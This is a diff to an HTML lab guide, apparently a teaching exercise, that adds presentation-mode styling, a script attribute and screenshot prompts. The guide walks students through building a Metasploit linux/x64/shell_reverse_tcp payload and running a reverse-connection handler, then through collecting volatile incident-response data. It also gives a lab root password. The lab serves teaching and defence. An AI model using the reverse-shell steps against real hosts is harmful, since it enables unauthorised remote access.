@@ -224,6 +224,9 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 .env-table td code,.env-table th code{font-family:var(--mono);font-size:.86em}
 .env-table tbody tr:hover{background:var(--card-2)}
 .env-note{color:var(--muted);font-size:.86rem;margin-top:6px}
+
+html[data-present="on"] .container > .callout{display:none!important}
+html[data-present="on"][data-pm-index="0"] .container > .callout{display:block!important}
 </style>
 </head>
 <body>
@@ -318,13 +321,14 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 </div>
 <div class="step"><p><span class="snum">3</span> Click on the terminal icon located in the top menu bar.</p>
 </div>
-<div class="step"><p><span class="snum">4</span> For the purpose of learning how to build a malicious Linux executable file and incidence response, we will ignore the social engineering process. Now, let's build a malicious Linux executable. First, we will create a directory to place the executable in. In the Terminal window, as shown below, type the command mkdir malicious and then press Enter. Then, cd malicious to go into the directory.</p>
+<div class="step"><p><span class="snum">4</span> For the purpose of learning how to build a malicious Linux executable file and incidence response, we will ignore the social engineering process. Now, let's build a malicious Linux executable. First, we will create a directory to place the executable in. In the Terminal window, type the command mkdir malicious and then press Enter. Then, cd malicious to go into the directory.</p>
 </div>
 <div class="step"><p><span class="snum">5</span> While inside the malicious directory, type and run the command msfconsole to start Metasploit. kali@kali $ msfconsole</p>
 </div>
 <div class="step"><p><span class="snum">6</span> Type the following command to search for the payload for the 64-bit Linux operating system. kali@kali $ search linux/x64/shell_reverse_tcp</p>
 </div>
 <div class="step"><p><span class="snum">7</span> Type use 0 to use the payload. Notice the prompt now says payload(linux/x64/shell_reverse_tcp). This indicates that we are using this payload now.</p>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Incident staged.</span> the Metasploit session (the compromise).</span></div>
 </div>
 <div class="step"><p><span class="snum">8</span> We will then see what options are available by running the command show options. We can see there are two options available: LHOST and LPORT. Currently, LPORT is set, and we need to configure the LHOST.</p>
 </div>
@@ -342,6 +346,7 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 <div class="callout tip"><span class="tag">[NOTE]</span> You can use setg LHOST local.ip.address.here to save the time on configuring the LHOST addresses. The setg will set the LHOST as a global variable. So, when its set, every module, payload that accepts LHOST will refer to the same entry.</div>
 </div>
 <div class="step"><p><span class="snum">15</span> We will now run the handler to wait for a reverse connection. Run the command exploit and leave the Terminal window open.</p>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">The foothold.</span> <code class='inl'>netstat</code> showing the suspicious connection.</span></div>
 </div>
 </div>
 <div class="subsection"><span class="phase-tag">Task 1.2</span><h3>Hosting the Malicious Executable</h3>
@@ -388,9 +393,11 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 <div class="step"><p><span class="snum">2</span> On the UbuntuSRV system, in the Terminal that still has the malicious executable running, click the + new tab button.</p>
 </div>
 <div class="step"><p><span class="snum">3</span> In the new Terminal tab, enter the command sudo su to escalate to root privileges. If prompted, enter NDGlabpass123! as the password.</p>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Root shell.</span> <code class='inl'>sudo su</code> for collection.</span></div>
 </div>
 <div class="step"><p><span class="snum">4</span> Create a file to contain any volatile data we can find. To put a heading into the file, enter the command below.</p>
 <div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span> echo sysadmin investigator &gt; report.txt</div>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">The report.</span> the completed report.txt evidence log.</span></div>
 </div>
 <div class="step"><p><span class="snum">5</span> Verify the report.txt file has been created with the student investigator title.</p>
 <div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span> cat report.txt</div>
@@ -406,6 +413,7 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 </div>
 <div class="step"><p><span class="snum">9</span> Append network interface information to the report.txt file.</p>
 <div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span>                           ifconfig -a &gt;&gt; report.txt</div>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Host + network.</span> <code class='inl'>hostname</code> / <code class='inl'>ifconfig -a</code> in the report.</span></div>
 </div>
 <div class="step"><p><span class="snum">10</span> Append network statistics to the report.txt file.</p>
 <div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span>                           netstat -ano &gt;&gt; report.txt</div>
@@ -421,6 +429,7 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 </div>
 <div class="step"><p><span class="snum">14</span> View output content from the report.txt. Press the spacebar to scroll down by page or press Enter to scroll down by a single line.</p>
 <div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span> cat report.txt | less</div>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Timestamp.</span> <code class='inl'>date</code> appended to report.txt.</span></div>
 </div>
 <div class="step"><p><span class="snum">15</span> When finished reviewing the contents, press Q to exit.</p>
 </div>
@@ -767,6 +776,7 @@ html[data-present="on"] .pm-dock{position:fixed;left:0;right:0;bottom:0;z-index:
     if (!sections.length) return;
     idx = Math.max(0, Math.min(sections.length - 1, i));
     sections.forEach(function (s, n) { s.classList.toggle("pm-current", n === idx); });
+    root.setAttribute("data-pm-index", String(idx));
     if (countEl) countEl.textContent = (idx + 1) + " / " + sections.length;
     if (nameEl) nameEl.textContent = labelFor(sections[idx]);
     if (prevBtn) prevBtn.disabled = idx === 0;
@@ -788,6 +798,7 @@ html[data-present="on"] .pm-dock{position:fixed;left:0;right:0;bottom:0;z-index:
   function exit() {
     root.removeAttribute("data-present");
     sections.forEach(function (s) { s.classList.remove("pm-current"); });
+    root.removeAttribute("data-pm-index");
     if (dock) dock.setAttribute("aria-hidden", "true");
     var btn = document.getElementById("pmToggle");
     if (btn) { btn.setAttribute("aria-pressed", "false");
